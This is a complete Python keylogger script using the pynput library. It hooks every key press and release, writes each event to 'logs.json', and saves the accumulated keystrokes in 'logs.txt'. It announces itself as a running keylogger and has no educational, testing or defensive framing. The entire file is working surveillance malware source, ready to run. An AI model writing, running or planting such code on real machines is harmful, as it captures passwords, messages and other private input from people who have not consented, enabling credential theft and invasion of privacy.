from pynput import keyboard
import json

key_list = []
x = False
key_strokes = ""

def update_txt_file(key_strokes):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key_strokes)

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'held': f'{key}'})
        x = True
    if x == True:
        key_list.append({'held': f'{key}'})
    update_json_file(key_list)
        
def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + str(key)
    update_txt_file(key_strokes)

print("[+] Running keylogger successfully!\n[!] Saving the key logs in 'logs.json'")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()